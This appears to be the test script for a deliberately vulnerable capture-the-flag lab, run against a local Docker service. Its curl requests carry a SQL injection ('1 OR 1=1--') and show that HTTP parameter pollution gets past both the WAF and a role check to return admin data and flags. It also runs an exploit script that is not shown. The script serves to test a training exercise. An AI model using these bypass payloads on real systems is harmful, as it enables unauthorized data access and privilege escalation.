#!/usr/bin/env bash
set -e
DC=$(docker compose version &>/dev/null && echo "docker compose" || echo "docker-compose")

$DC down 2>/dev/null || true
$DC up --build -d
sleep 4

PASS=0; FAIL=0

check() {
    local label="$1" result="$2"
    if [ "$result" = "1" ]; then echo "[PASS] $label"; PASS=$((PASS+1))
    else echo "[FAIL] $label"; FAIL=$((FAIL+1)); fi
}

until nc -z -w2 127.0.0.1 8098 2>/dev/null; do sleep 1; done

BASE="http://127.0.0.1:8098"

# Test 1: normal search works
OUT=$(curl -s "${BASE}/api/search?id=1" 2>/dev/null)
check "normal search id=1 returns alice" "$( echo "$OUT" | grep -q '"alice"' && echo 1 || echo 0 )"

# Test 2: direct SQLi is blocked by WAF
OUT=$(curl -s "${BASE}/api/search?id=1%20OR%201%3D1--" 2>/dev/null)
check "WAF blocks direct SQLi" "$( echo "$OUT" | grep -q 'WAF' && echo 1 || echo 0 )"

# Test 3: HPP bypasses WAF (first param clean, second has injection)
OUT=$(curl -s "${BASE}/api/search?id=1&id=1%20OR%201%3D1--" 2>/dev/null)
check "HPP bypasses WAF and returns admin row" "$( echo "$OUT" | grep -q '"admin"' && echo 1 || echo 0 )"

# Test 4: role=user has no admin access
OUT=$(curl -s "${BASE}/api/admin?role=user" 2>/dev/null)
check "role=user gets no admin access" "$( echo "$OUT" | grep -q '"message"' && echo 1 || echo 0 )"

# Test 5: HPP bypasses role check (first=user, last=admin)
OUT=$(curl -s "${BASE}/api/admin?role=user&role=admin" 2>/dev/null)
check "HPP with role=user&role=admin returns flag2" "$( echo "$OUT" | grep -q '"flag2"' && echo 1 || echo 0 )"

# Test 6: full exploit
EXPLOIT_OUT=$(python3 exploit/exploit.py 127.0.0.1 8098 2>&1)
FLAG1=$(echo "$EXPLOIT_OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | head -1)
FLAG2=$(echo "$EXPLOIT_OUT" | grep -oE 'POC\{[0-9a-f]{32}\}' | tail -1)
check "exploit gets flag1 via WAF bypass" "$( [ -n "$FLAG1" ] && echo 1 || echo 0 )"
check "exploit gets flag2 via role bypass" "$( [ -n "$FLAG2" ] && echo 1 || echo 0 )"
[ -n "$FLAG1" ] && echo "    flag1=$FLAG1"
[ -n "$FLAG2" ] && echo "    flag2=$FLAG2"

$DC down

echo ""
echo "Results: $PASS passed, $FAIL failed"
[ "$FAIL" -eq 0 ]
